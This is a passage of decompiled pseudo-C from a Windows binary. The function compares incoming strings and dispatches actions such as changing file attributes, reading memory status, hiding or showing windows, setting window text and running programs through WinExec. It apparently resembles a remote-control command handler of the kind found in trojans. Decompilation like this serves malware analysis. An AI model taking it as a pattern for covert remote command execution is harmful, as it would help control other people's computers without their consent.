-1;\n                            uVar11 = iVar10 == 0;\n                        } while (!uVar11);\n                    }\n                }\n            }\n            var_270h = 0x477553;\n            fcn.00405530();\n            var_270h = 0x47755d;\n            fcn.00475d98();\n        }\n    }\n    var_270h = &fcn.00476010::var_350h;\n    var_274h = 0x477576;\n    fcn.00405a44();\n    var_274h = 0x477586;\n    fcn.00405974();\n    if (uVar11) {\n        var_274h = 0x47759a;\n        fcn.00405a84();\n        var_274h = 0x4775a7;\n        fcn.00405584();\n    }\n    var_274h = &fcn.00476010::var_354h;\n    var_278h = 0x4775c0;\n    fcn.00405a44();\n    var_278h = 0x4775d0;\n    fcn.00405974();\n    if (uVar11) {\n        var_278h = 0x4775e8;\n        fcn.00405a84();\n        var_278h = 0;\n        var_27ch = 0x4775ef;\n        sub.ole32.dll_CoInitialize();\n        var_27ch = &fcn.00476010::var_ch;\n        var_280h = 0x477600;\n        fcn.00405b28();\n        var_280h = 0x477610;\n        fcn.00405a44();\n        var_280h = 0x47761d;\n        fcn.00405b28();\n        var_280h = 0x47762c;\n        fcn.00405a84();\n        var_280h = &fcn.00476010::var_10h;\n        var_284h = 0x47763d;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_284h = 0x47764d;\n        fcn.00405a44();\n        var_284h = 0x47765a;\n        fcn.00405b28();\n        var_284h = 0x477669;\n        fcn.00405a84();\n        var_284h = 0x477674;\n        fcn.004055c8();\n        var_284h = 0x477682;\n        fcn.0046e50c();\n        var_284h = 0x477687;\n        sub.ole32.dll_CoUninitialize();\n    }\n    var_284h = &fcn.00476010::var_358h;\n    var_288h = 0x4776a0;\n    fcn.00405a44();\n    var_288h = 0x4776b0;\n    fcn.00405974();\n    if (uVar11) {\n        var_288h = 0x4776c8;\n        fcn.00405a84();\n        var_288h = &fcn.00476010::var_ch;\n        var_28ch = 0x4776d9;\n        fcn.00405b28();\n        var_28ch = 0x4776e9;\n        fcn.00405a44();\n        var_28ch = 0x4776f6;\n        fcn.00405b28();\n        var_28ch = 0x477705;\n        fcn.00405a84();\n        var_28ch = 0x477710;\n        fcn.004055c8();\n        var_28ch = 0x47771e;\n        fcn.0040a5a8();\n        var_28ch = 0x47772c;\n        fcn.00405818();\n        var_28ch = 0x47773a;\n        cVar1 = fcn.0046db48();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            var_28ch = 0x477748;\n            fcn.00475d98();\n        }\n    }\n    var_28ch = &fcn.00476010::var_360h;\n    var_290h = 0x477761;\n    fcn.00405a44();\n    var_290h = 0x477771;\n    fcn.00405974();\n    if (uVar11) {\n        var_290h = 0x477785;\n        fcn.00405a84();\n        var_290h = &fcn.00476010::var_ch;\n        var_294h = 0x477796;\n        fcn.00405b28();\n        var_294h = 0x4777a6;\n        fcn.00405a44();\n        var_294h = 0x4777b3;\n        fcn.00405b28();\n        var_294h = 0x4777c2;\n        fcn.00405a84();\n        var_294h = 0x4777cd;\n        fcn.004055c8();\n        var_294h = 0x4777d8;\n        cVar1 = fcn.0046db48();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            var_294h = 0x4777e6;\n            fcn.00475d98();\n        }\n    }\n    var_294h = &fcn.00476010::var_364h;\n    var_298h = 0x4777ff;\n    fcn.00405a44();\n    var_298h = 0x47780f;\n    fcn.00405974();\n    if (uVar11) {\n        var_298h = &fcn.00476010::var_368h;\n        var_29ch = 0x477833;\n        fcn.00405a44();\n        var_29ch = 0x47783e;\n        cVar1 = fcn.0046db2c();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            var_29ch = 0x477858;\n            fcn.00475d98();\n        }\n        else {\n            var_29ch = 0x47784c;\n            fcn.00475d98();\n        }\n    }\n    var_29ch = &fcn.00476010::var_36ch;\n    var_2a0h = 0x477871;\n    fcn.00405a44();\n    var_2a0h = 0x477881;\n    fcn.00405974();\n    if (uVar11) {\n        var_2a0h = 0x477895;\n        fcn.00405a84();\n        var_2a0h = 0x47789d;\n        cVar1 = fcn.0048ce68();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            var_2a0h = 0x47da00;\n            var_2a4h = var_8h;\n            var_2a8h = 0x47da10;\n            var_2ach = 0x4778be;\n            fcn.004058e0();\n            var_2ach = 0x4778c9;\n            fcn.0046d488();\n        }\n        var_2ach = 0x4778d3;\n        fcn.00475d98();\n    }\n    var_2ach = &fcn.00476010::var_374h;\n    var_2b0h = 0x4778ec;\n    fcn.00405a44();\n    var_2b0h = 0x4778fc;\n    fcn.00405974();\n    if (uVar11) {\n        var_2b0h = 0x477910;\n        fcn.00405a84();\n        var_2b0h = 2;\n        var_2b4h = 0x47791a;\n        var_2b4h = fcn.004059dc();\n        var_2b8h = 0x477920;\n        sub.kernel32.dll_SetFileAttributesA();\n    }\n    var_2b8h = &fcn.00476010::var_378h;\n    var_2bch = 0x477939;\n    fcn.00405a44();\n    var_2bch = 0x477949;\n    fcn.00405974();\n    if (uVar11) {\n        var_2bch = 0x47795d;\n        fcn.00405a84();\n        var_2bch = 0x80;\n        var_2c0h = 0x47796a;\n        var_2c0h = fcn.004059dc();\n        var_2c4h = 0x477970;\n        sub.kernel32.dll_SetFileAttributesA();\n    }\n    var_2c4h = 0x47797d;\n    fcn.00405974();\n    if (uVar11) {\n        var_2c4h = &fcn.00476010::lpBuffer;\n        var_2c8h = 0x47798b;\n        sub.kernel32.dll_GlobalMemoryStatus();\n        var_2c8h = 0x47da48;\n        var_2cch = 0x477995;\n        fcn.0046e6cc();\n        var_2cch = 0x4779a0;\n        fcn.00409d78();\n        var_2cch = var_380h;\n        var_2d0h = 0x47d4b4;\n        var_2d4h = &fcn.00476010::var_384h;\n        var_38ch = var_204h;\n        var_388h = var_388h & 0xffffff00;\n        uVar11 = 1;\n        var_2d8h = 0x4779d7;\n        fcn.0040afa0(var_2d4h);\n        var_2d8h = var_384h;\n        var_2dch = 0x4779ed;\n        fcn.004058e0();\n        var_2dch = 0x4779f8;\n        fcn.00475d98();\n    }\n    var_2c4h = &fcn.00476010::var_390h;\n    var_2c8h = 0x477a11;\n    fcn.00405a44();\n    var_2c8h = 0x477a21;\n    fcn.00405974();\n    if (uVar11) {\n        var_2c8h = 0x477a2e;\n        fcn.0046e840();\n        var_2c8h = 0x477a44;\n        fcn.00405864();\n        var_2c8h = 0x477a4f;\n        fcn.00475d98();\n    }\n    var_2c8h = &fcn.00476010::var_39ch;\n    var_2cch = 0x477a68;\n    fcn.00405a44();\n    var_2cch = 0x477a78;\n    fcn.00405974();\n    if (uVar11) {\n        var_2cch = 0x477a8c;\n        fcn.00405a84();\n        var_2d0h = 0x477a98;\n        var_2cch = &stack0xfffffffc;\n        fcn.00485198();\n        var_2d0h = 0x477aab;\n        fcn.00475f44(var_2cch);\n    }\n    var_2cch = &fcn.00476010::var_3a4h;\n    var_2d0h = 0x477ac5;\n    fcn.00405a44();\n    var_2d0h = 0x477ad5;\n    fcn.00405974();\n    if (uVar11) {\n        var_2d0h = 0x477aed;\n        fcn.00405a84();\n        var_2d0h = &fcn.00476010::var_ch;\n        var_2d4h = 0x477afe;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_2d4h = 0x477b0e;\n        fcn.00405a44();\n        var_2d4h = 0x477b1b;\n        fcn.00405b28();\n        var_2d4h = 0x477b2a;\n        fcn.00405a84();\n        var_2d4h = 0x477b35;\n        fcn.004055c8();\n        var_2d8h = 0x477b3e;\n        var_2d4h = &stack0xfffffffc;\n        fcn.00409ee4();\n        var_2d8h = 0x477b49;\n        fcn.0046df20();\n        var_2d8h = 0x477b5c;\n        fcn.00475f44(var_2d4h);\n    }\n    var_2d4h = &fcn.00476010::var_3ach;\n    var_2d8h = 0x477b76;\n    fcn.00405a44();\n    var_2d8h = 0x477b86;\n    fcn.00405974();\n    if (uVar11) {\n        var_2d8h = 0x477b9e;\n        fcn.00405a84();\n        var_2d8h = &fcn.00476010::var_ch;\n        var_2dch = 0x477baf;\n        fcn.00405b28();\n        var_2dch = 0x477bbf;\n        fcn.00405a44();\n        var_2dch = 0x477bcc;\n        fcn.00405b28();\n        var_2dch = 0x477bdb;\n        fcn.00405a84();\n        var_2dch = 0x477be3;\n        iVar4 = fcn.00409ee4();\n        uVar11 = iVar4 == 0;\n        if (0 < iVar4) {\n            iVar6 = 1;\n            iVar10 = iVar4;\n            do {\n                if (iVar4 == iVar6) {\n                    var_2dch = 0x477c4e;\n                    fcn.00409ee4();\n                    var_2dch = 0x477c53;\n                    fcn.00484e64();\n                }\n                else {\n                    var_2d8h = &fcn.00476010::var_3b0h;\n                    var_2e0h = 0x477c08;\n                    fcn.00405b28();\n                    var_2e0h = 0x477c18;\n                    fcn.00405a44();\n                    var_2e0h = 0x477c23;\n                    fcn.00409ee4();\n                    var_2e0h = 0x477c28;\n                    fcn.00484e64();\n                    var_2e0h = 0x477c35;\n                    fcn.00405b28();\n                    var_2e0h = 0x477c44;\n                    fcn.00405a84();\n                }\n                iVar6 = iVar6 + 1;\n                iVar10 = iVar10 + -1;\n                uVar11 = iVar10 == 0;\n            } while (!uVar11);\n        }\n        var_2dch = 0x477c61;\n        fcn.00475d98();\n    }\n    var_2dch = &fcn.00476010::var_3b4h;\n    var_2e0h = 0x477c7a;\n    fcn.00405a44();\n    var_2e0h = 0x477c8a;\n    fcn.00405974();\n    if (uVar11) {\n        var_2e0h = 0x477ca2;\n        fcn.00405a84();\n        var_2e0h = 0x477cae;\n        var_1a8h = fcn.00404620();\n        var_2e4h = 0x477d32;\n        var_2e8h = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.00476010::var_2e8h;\n        var_2ech = 0x477cd0;\n        var_2e0h = &stack0xfffffffc;\n        (**(*var_1a8h + 0x2c))();\n        do {\n            var_2ech = 0x477ce3;\n            (**(*var_1a8h + 0xc))();\n            var_2ech = 0x477cee;\n            fcn.00409ee4();\n            var_2ech = 0x477cf3;\n            fcn.00484e64();\n            var_2ech = 0x477d00;\n            (**(*var_1a8h + 0x48))();\n            var_2ech = 0x477d0b;\n            iVar4 = (**(*var_1a8h + 0x14))();\n        } while (iVar4 != 0);\n        var_2ech = 0x477d19;\n        fcn.00475d98();\n        *in_FS_OFFSET = var_2e8h;\n        var_2e0h = 0x477d39;\n        var_2e4h = 0x477d31;\n        fcn.00404650();\n        return;\n    }\n    var_2e0h = &fcn.00476010::var_3bch;\n    var_2e4h = 0x477d52;\n    fcn.00405a44();\n    var_2e4h = 0x477d62;\n    fcn.00405974();\n    if (uVar11) {\n        var_2e4h = 0x477d76;\n        fcn.00405a84();\n        var_2e4h = 0x477d7e;\n        fcn.00409ee4();\n        var_2e4h = 0x477d83;\n        fcn.00484e64();\n        var_2e4h = 0x477d8d;\n        fcn.00475d98();\n    }\n    var_2e4h = &fcn.00476010::var_3c0h;\n    var_2e8h = 0x477da6;\n    fcn.00405a44();\n    var_2e8h = 0x477db6;\n    fcn.00405974();\n    if (uVar11) {\n        var_2e8h = 0x477dce;\n        fcn.00405a84();\n        var_2e8h = &fcn.00476010::var_ch;\n        var_2ech = 0x477ddf;\n        fcn.00405b28();\n        var_2ech = 0x477def;\n        fcn.00405a44();\n        var_2ech = 0x477dfc;\n        fcn.00405b28();\n        var_2ech = 0x477e0b;\n        fcn.00405a84();\n        var_2ech = &fcn.00476010::var_10h;\n        var_2f0h = 0x477e1c;\n        fcn.00405b28();\n        var_2f0h = 0x477e2c;\n        fcn.00405a44();\n        var_2f0h = 0x477e39;\n        fcn.00405b28();\n        var_2f0h = 0x477e48;\n        fcn.00405a84();\n        var_2f0h = &fcn.00476010::var_14h;\n        var_2f4h = 0x477e59;\n        fcn.00405b28();\n        var_2f4h = 0x477e69;\n        fcn.00405a44();\n        var_2f4h = 0x477e76;\n        fcn.00405b28();\n        var_2f4h = 0x477e85;\n        fcn.00405a84();\n        var_2f4h = &fcn.00476010::var_18h;\n        var_2f8h = 0x477e96;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_2f8h = 0x477ea6;\n        fcn.00405a44();\n        var_2f8h = 0x477eb3;\n        fcn.00405b28();\n        var_2f8h = 0x477ec2;\n        fcn.00405a84();\n        var_2f8h = 0x477ecd;\n        fcn.004055c8();\n        var_2fch = 0x477edf;\n        var_2f8h = &stack0xfffffffc;\n        fcn.0046eb14();\n        var_2fch = var_3c8h;\n        var_300h = 0x47d4b4;\n        var_304h = 0x477efb;\n        fcn.0046ebd4();\n        var_304h = var_3cch;\n        var_308h = 0x477f11;\n        fcn.004058e0();\n        var_308h = 0x477f22;\n        fcn.00475f44(var_304h);\n    }\n    var_304h = &fcn.00476010::var_3d0h;\n    var_308h = 0x477f3c;\n    fcn.00405a44();\n    var_308h = 0x477f4c;\n    fcn.00405974();\n    if (uVar11) {\n        var_308h = 0x477f64;\n        fcn.00405a84();\n        var_308h = &fcn.00476010::var_ch;\n        var_30ch = 0x477f7a;\n        fcn.00405a44();\n        var_30ch = 0x477f8c;\n        fcn.00405a84();\n        var_30ch = &fcn.00476010::var_10h;\n        var_310h = 0x477f9d;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_310h = 0x477fad;\n        fcn.00405a44();\n        var_310h = 0x477fba;\n        fcn.00405b28();\n        var_310h = 0x477fc9;\n        fcn.00405a84();\n        var_310h = 0x477fd7;\n        fcn.0046e1f8();\n    }\n    var_310h = &fcn.00476010::var_3d4h;\n    var_314h = 0x477ff0;\n    fcn.00405a44();\n    var_314h = 0x478000;\n    fcn.00405974();\n    if (uVar11) {\n        var_314h = 0x478014;\n        fcn.00405a84();\n        uVar11 = var_8h == NULL || var_8h == 0x4;\n        var_314h = &fcn.00476010::var_3d8h;\n        var_318h = 0x478036;\n        fcn.00405a44();\n        var_318h = var_3d8h;\n        var_31ch = &fcn.00476010::var_3dch;\n        var_320h = 0x478056;\n        fcn.00405a44();\n        var_31ch = 0x478062;\n        fcn.0046e360();\n    }\n    var_31ch = &fcn.00476010::var_3e0h;\n    var_320h = 0x47807b;\n    fcn.00405a44();\n    var_320h = 0x47808b;\n    fcn.00405974();\n    if (uVar11) {\n        var_320h = 0x47809f;\n        fcn.00405a84();\n        uVar11 = var_8h == NULL || var_8h == 0x4;\n        var_320h = &fcn.00476010::var_3e4h;\n        var_324h = 0x4780c1;\n        fcn.00405a44();\n        var_324h = var_3e4h;\n        var_328h = &fcn.00476010::var_3e8h;\n        var_32ch = 0x4780e1;\n        fcn.00405a44();\n        var_328h = 0x4780ed;\n        fcn.0046e078();\n    }\n    var_328h = &fcn.00476010::var_3ech;\n    var_32ch = 0x478106;\n    fcn.00405a44();\n    var_32ch = 0x478116;\n    fcn.00405974();\n    if (uVar11) {\n        var_32ch = 0x47812e;\n        fcn.00405a84();\n        var_32ch = &fcn.00476010::var_ch;\n        var_330h = 0x47813f;\n        fcn.00405b28();\n        var_330h = 0x47814f;\n        fcn.00405a44();\n        var_330h = 0x47815c;\n        fcn.00405b28();\n        var_330h = 0x47816b;\n        fcn.00405a84();\n        var_330h = &fcn.00476010::var_10h;\n        var_334h = 0x47817c;\n        fcn.00405b28();\n        var_334h = 0x47818c;\n        fcn.00405a44();\n        var_334h = 0x478199;\n        fcn.00405b28();\n        var_334h = 0x4781a8;\n        fcn.00405a84();\n        var_334h = &fcn.00476010::var_14h;\n        var_338h = 0x4781b9;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_338h = 0x4781c9;\n        fcn.00405a44();\n        var_338h = 0x4781d6;\n        fcn.00405b28();\n        var_338h = 0x4781e5;\n        fcn.00405a84();\n        var_338h = var_8h;\n        var_33ch = 0x4781f7;\n        fcn.0046f180(var_8h);\n    }\n    var_33ch = &fcn.00476010::var_3f0h;\n    var_340h = 0x478210;\n    fcn.00405a44();\n    var_340h = 0x478220;\n    fcn.00405974();\n    if (uVar11) {\n        var_340h = 0x478238;\n        fcn.00405a84();\n        var_340h = &fcn.00476010::var_ch;\n        var_344h = 0x478249;\n        fcn.00405b28();\n        var_344h = 0x478259;\n        fcn.00405a44();\n        var_344h = 0x478266;\n        fcn.00405b28();\n        var_344h = 0x478275;\n        fcn.00405a84();\n        var_344h = &fcn.00476010::var_10h;\n        var_348h = 0x478286;\n        fcn.00405b28();\n        var_348h = 0x478296;\n        fcn.00405a44();\n        var_348h = 0x4782a3;\n        fcn.00405b28();\n        var_348h = 0x4782b2;\n        fcn.00405a84();\n        var_348h = &fcn.00476010::var_14h;\n        var_34ch = 0x4782c3;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_34ch = 0x4782d3;\n        fcn.00405a44();\n        var_34ch = 0x4782e0;\n        fcn.00405b28();\n        var_34ch = 0x4782ef;\n        fcn.00405a84();\n        var_34ch = var_8h;\n        var_350h = 0x478301;\n        fcn.0046efb4(var_8h);\n    }\n    var_350h = &fcn.00476010::var_3f4h;\n    var_354h = 0x47831a;\n    fcn.00405a44();\n    var_354h = 0x47832a;\n    fcn.00405974();\n    if (uVar11) {\n        var_354h = 0x478342;\n        fcn.00405a84();\n        var_354h = &fcn.00476010::var_ch;\n        var_358h = 0x478353;\n        fcn.00405b28();\n        var_358h = 0x478363;\n        fcn.00405a44();\n        var_358h = 0x478370;\n        fcn.00405b28();\n        var_358h = 0x47837f;\n        fcn.00405a84();\n        var_358h = &fcn.00476010::var_10h;\n        var_35ch = 0x478390;\n        fcn.00405b28();\n        var_35ch = 0x4783a0;\n        fcn.00405a44();\n        var_35ch = 0x4783ad;\n        fcn.00405b28();\n        var_35ch = 0x4783bc;\n        fcn.00405a84();\n        var_35ch = &fcn.00476010::var_14h;\n        var_360h = 0x4783cd;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_360h = 0x4783dd;\n        fcn.00405a44();\n        var_360h = 0x4783ea;\n        fcn.00405b28();\n        var_360h = 0x4783f9;\n        fcn.00405a84();\n        var_360h = var_8h;\n        var_364h = 0x47840b;\n        fcn.0046f09c(var_8h);\n    }\n    var_364h = &fcn.00476010::var_3f8h;\n    var_368h = 0x478424;\n    fcn.00405a44();\n    var_368h = 0x478434;\n    fcn.00405974();\n    if (uVar11) {\n        var_368h = 0x47844c;\n        fcn.00405a84();\n        var_368h = &fcn.00476010::var_ch;\n        var_36ch = 0x47845d;\n        fcn.00405b28();\n        var_36ch = 0x47846d;\n        fcn.00405a44();\n        var_36ch = 0x47847a;\n        fcn.00405b28();\n        var_36ch = 0x478489;\n        fcn.00405a84();\n        var_36ch = &fcn.00476010::var_10h;\n        var_370h = 0x47849a;\n        fcn.00405b28();\n        var_370h = 0x4784aa;\n        fcn.00405a44();\n        var_370h = 0x4784b7;\n        fcn.00405b28();\n        var_370h = 0x4784c6;\n        fcn.00405a84();\n        var_370h = &fcn.00476010::var_14h;\n        var_374h = 0x4784d7;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_374h = 0x4784e7;\n        fcn.00405a44();\n        var_374h = 0x4784f4;\n        fcn.00405b28();\n        var_374h = 0x478503;\n        fcn.00405a84();\n        var_374h = 0x47850e;\n        fcn.004055c8();\n        var_374h = 0x47851b;\n        fcn.00405974();\n        if (uVar11) {\n            var_378h = 0x478529;\n            var_374h = &stack0xfffffffc;\n            fcn.0046f4ac();\n            var_378h = &fcn.00476010::var_3fch;\n            var_37ch = 0x47853b;\n            fcn.0046f6d8();\n            var_378h = 0x478547;\n            fcn.00405818();\n            var_378h = 0x478558;\n            fcn.00475f44(var_374h);\n        }\n        else {\n            var_378h = 0x478567;\n            var_374h = &stack0xfffffffc;\n            fcn.0046f4ac();\n            var_378h = 0x478578;\n            fcn.00475f44(var_374h);\n        }\n    }\n    var_374h = &fcn.00476010::var_408h;\n    var_378h = 0x478592;\n    fcn.00405a44();\n    var_378h = 0x4785a2;\n    fcn.00405974();\n    if (uVar11) {\n        var_378h = 0x4785b6;\n        fcn.00405a84();\n        var_378h = NULL;\n        var_37ch = 0;\n        var_380h = 0x10;\n        var_384h = 0x4785c4;\n        var_384h = fcn.00409ee4();\n        var_388h = 0x4785ca;\n        sub.user32.dll_SendMessageA();\n    }\n    var_388h = &fcn.00476010::var_40ch;\n    var_38ch = 0x4785e3;\n    fcn.00405a44();\n    var_38ch = 0x4785f3;\n    fcn.00405974();\n    if (uVar11) {\n        var_38ch = 0x478607;\n        fcn.00405a84();\n        var_38ch = 3;\n        var_390h = 0x478611;\n        var_390h = fcn.00409ee4();\n        var_394h = 0x478617;\n        sub.user32.dll_ShowWindow();\n    }\n    var_394h = &fcn.00476010::var_410h;\n    var_398h = 0x478630;\n    fcn.00405a44();\n    var_398h = 0x478640;\n    fcn.00405974();\n    if (uVar11) {\n        var_398h = 0x478654;\n        fcn.00405a84();\n        var_398h = 6;\n        var_39ch = 0x47865e;\n        var_39ch = fcn.00409ee4();\n        var_3a0h = 0x478664;\n        sub.user32.dll_ShowWindow();\n    }\n    var_3a0h = &fcn.00476010::var_414h;\n    var_3a4h = 0x47867d;\n    fcn.00405a44();\n    var_3a4h = 0x47868d;\n    fcn.00405974();\n    if (uVar11) {\n        var_3a4h = 0x4786a1;\n        fcn.00405a84();\n        var_3a4h = 0;\n        var_3a8h = 0x4786ab;\n        var_3a8h = fcn.00409ee4();\n        var_3ach = 0x4786b1;\n        sub.user32.dll_ShowWindow();\n    }\n    var_3ach = &fcn.00476010::var_418h;\n    var_3b0h = 0x4786ca;\n    fcn.00405a44();\n    var_3b0h = 0x4786da;\n    fcn.00405974();\n    if (uVar11) {\n        var_3b0h = 0x4786ee;\n        fcn.00405a84();\n        var_3b0h = 5;\n        var_3b4h = 0x4786f8;\n        var_3b4h = fcn.00409ee4();\n        var_3b8h = 0x4786fe;\n        sub.user32.dll_ShowWindow();\n    }\n    var_3b8h = &fcn.00476010::var_41ch;\n    var_3bch = 0x478717;\n    fcn.00405a44();\n    var_3bch = 0x478727;\n    fcn.00405974();\n    if (uVar11) {\n        var_3bch = 0x47873b;\n        fcn.00405a84();\n        var_3bch = &fcn.00476010::var_ch;\n        var_3c0h = 0x47874c;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_3c0h = 0x47875c;\n        fcn.00405a44();\n        var_3c0h = 0x478769;\n        fcn.00405b28();\n        var_3c0h = 0x478778;\n        fcn.00405a84();\n        var_3c0h = 0x478783;\n        fcn.004055c8();\n        var_3c0h = 0x47878b;\n        var_3c0h = fcn.004059dc();\n        var_3c4h = 0x478794;\n        var_3c4h = fcn.00409ee4();\n        var_3c8h = 0x47879a;\n        sub.user32.dll_SetWindowTextA();\n    }\n    var_3c8h = &fcn.00476010::var_420h;\n    var_3cch = 0x4787b3;\n    fcn.00405a44();\n    var_3cch = 0x4787c3;\n    fcn.00405974();\n    if (uVar11) {\n        var_3cch = 0x4787db;\n        fcn.00405a84();\n        var_3cch = &fcn.00476010::var_ch;\n        var_3d0h = 0x4787ec;\n        fcn.00405b28();\n        var_3d0h = 0x4787fc;\n        fcn.00405a44();\n        var_3d0h = 0x478809;\n        fcn.00405b28();\n        var_3d0h = 0x478818;\n        fcn.00405a84();\n        var_3d0h = &fcn.00476010::var_10h;\n        var_3d4h = 0x478829;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_3d4h = 0x478839;\n        fcn.00405a44();\n        var_3d4h = 0x478846;\n        fcn.00405b28();\n        var_3d4h = 0x478855;\n        fcn.00405a84();\n        var_3d4h = 0x478860;\n        fcn.004055c8();\n        var_3d8h = 0x47886c;\n        var_3d4h = &stack0xfffffffc;\n        fcn.0048acd0();\n        var_3d8h = 0x47887d;\n        fcn.00475f44(var_3d4h);\n    }\n    var_3d4h = &fcn.00476010::var_428h;\n    var_3d8h = 0x478897;\n    fcn.00405a44();\n    var_3d8h = 0x4788a7;\n    fcn.00405974();\n    if (uVar11) {\n        var_3d8h = 0x4788bb;\n        fcn.00405a84();\n        var_3d8h = 0x4788c3;\n        fcn.0048af7c();\n    }\n    var_3d8h = &fcn.00476010::var_42ch;\n    var_3dch = 0x4788dc;\n    fcn.00405a44();\n    var_3dch = 0x4788ec;\n    fcn.00405974();\n    if (uVar11) {\n        var_3dch = 0x478900;\n        fcn.00405a84();\n        var_3dch = &fcn.00476010::var_ch;\n        var_3e0h = 0x478911;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_3e0h = 0x478921;\n        fcn.00405a44();\n        var_3e0h = 0x47892e;\n        fcn.00405b28();\n        var_3e0h = 0x47893d;\n        fcn.00405a84();\n        var_3e0h = 0x478948;\n        fcn.004055c8();\n        var_3e0h = 0x478953;\n        fcn.0048b030();\n    }\n    var_3e0h = &fcn.00476010::var_430h;\n    var_3e4h = 0x47896c;\n    fcn.00405a44();\n    var_3e4h = 0x47897c;\n    fcn.00405974();\n    if (uVar11) {\n        var_3e4h = 0x478990;\n        fcn.00405a84();\n        var_3e4h = 5;\n        var_3e8h = 0x47899a;\n        var_3e8h = fcn.004059dc();\n        var_3ech = 0x4789a0;\n        sub.kernel32.dll_WinExec();\n    }\n    var_3ech = &fcn.00476010::var_434h;\n    var_3f0h = 0x4789b9;\n    fcn.00405a44();\n    var_3f0h = 0x4789c9;\n    fcn.00405974();\n    if (uVar11) {\n        var_3f0h = 0x4789e1;\n        fcn.00405a84();\n        var_3f0h = &fcn.00476010::var_ch;\n        var_3f4h = 0x4789f2;\n        fcn.00405b28();\n        var_3f4h = 0x478a02;\n        fcn.00405a44();\n        var_3f4h = 0x478a0f;\n        fcn.00405b28();\n        var_3f4h = 0x478a1e;\n        fcn.00405a84();\n        var_3f4h = &fcn.00476010::var_10h;\n        var_3f8h = 0x478a2f;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_3f8h = 0x478a3f;\n        fcn.00405a44();\n        var_3f8h = 0x478a4c;\n        fcn.00405b28();\n        var_3f8h = 0x478a5b;\n        fcn.00405a84();\n        var_3f8h = 0x478a66;\n        fcn.004055c8();\n        var_3fch = 0x478a72;\n        var_3f8h = &stack0xfffffffc;\n        fcn.0047175c();\n        var_3fch = 0x478a83;\n        fcn.00475f44(var_3f8h);\n    }\n    var_3f8h = &fcn.00476010::var_43ch;\n    var_3fch = 0x478a9d;\n    fcn.00405a44();\n    var_3fch = 0x478aad;\n    fcn.00405974();\n    if (uVar11) {\n        var_3fch = 0x478ac1;\n        fcn.00405a84();\n        var_3fch = 0x478acc;\n        fcn.0046dafc();\n        var_3fch = 0x478ada;\n        fcn.0046de54();\n    }\n    var_3fch = &fcn.00476010::var_444h;\n    var_400h = 0x478af3;\n    fcn.00405a44();\n    var_400h = 0x478b03;\n    fcn.00405974();\n    if (uVar11) {\n        var_400h = 0x478b17;\n        fcn.00405a84();\n        var_400h = 0x478b22;\n        fcn.0046dafc();\n        var_400h = 0x478b30;\n        fcn.0046dd8c();\n    }\n    var_400h = &fcn.00476010::var_44ch;\n    var_404h = 0x478b49;\n    fcn.00405a44();\n    var_404h = 0x478b59;\n    fcn.00405974();\n    if (uVar11) {\n        var_404h = 0x478b6d;\n        fcn.00405a84();\n        var_404h = 0x478b75;\n        fcn.004716cc();\n    }\n    var_404h = &fcn.00476010::var_450h;\n    var_408h = 0x478b8e;\n    fcn.00405a44();\n    var_408h = 0x478b9e;\n    fcn.00405974();\n    if (uVar11) {\n        var_408h = 0x478bb6;\n        fcn.00405a84();\n        var_408h = &fcn.00476010::var_ch;\n        var_40ch = 0x478bc7;\n        fcn.00405b28();\n        var_40ch = 0x478bd7;\n        fcn.00405a44();\n        var_40ch = 0x478be4;\n        fcn.00405b28();\n        var_40ch = 0x478bf3;\n        fcn.00405a84();\n        var_40ch = &fcn.00476010::var_10h;\n        var_410h = 0x478c04;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_410h = 0x478c14;\n        fcn.00405a44();\n        var_410h = 0x478c21;\n        fcn.00405b28();\n        var_410h = 0x478c30;\n        fcn.00405a84();\n        var_410h = 0x478c3b;\n        fcn.004055c8();\n        var_410h = 0x478c43;\n        fcn.004059dc();\n        var_410h = 0x478c50;\n        fcn.00405728();\n        var_410h = var_454h;\n        var_414h = 0x478c5f;\n        var_414h = fcn.004059dc();\n        var_418h = 0x478c68;\n        fcn.004059dc();\n        var_410h = 0x478c6f;\n        fcn.0047196c();\n    }\n    var_410h = &fcn.00476010::var_458h;\n    var_414h = 0x478c88;\n    fcn.00405a44();\n    var_414h = 0x478c98;\n    fcn.00405974();\n    if (uVar11) {\n        var_414h = 0x478cb0;\n        fcn.00405a84();\n        var_414h = &fcn.00476010::var_ch;\n        var_418h = 0x478cc1;\n        fcn.00405b28();\n        var_418h = 0x478cd1;\n        fcn.00405a44();\n        var_418h = 0x478cde;\n        fcn.00405b28();\n        var_418h = 0x478ced;\n        fcn.00405a84();\n        var_418h = &fcn.00476010::var_10h;\n        var_41ch = 0x478cfe;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 1;\n        var_41ch = 0x478d0e;\n        fcn.00405a44();\n        var_41ch = 0x478d1b;\n        fcn.00405b28();\n        var_41ch = 0x478d2a;\n        fcn.00405a84();\n        var_41ch = 0x478d35;\n        fcn.004055c8();\n        var_420h = 0x478d41;\n        var_41ch = &stack0xfffffffc;\n        fcn.0046f860();\n        var_420h = 0x478d52;\n        fcn.00475f44(var_41ch);\n    }\n    var_41ch = &fcn.00476010::var_460h;\n    var_420h = 0x478d6c;\n    fcn.00405a44();\n    var_420h = 0x478d7c;\n    fcn.00405974();\n    if (uVar11) {\n        var_420h = 0x478d94;\n        fcn.00405a84();\n        var_420h = &fcn.00476010::var_ch;\n        var_424h = 0x478da5;\n        iVar4 = fcn.00405b28();\n        uVar11 = iVar4 == 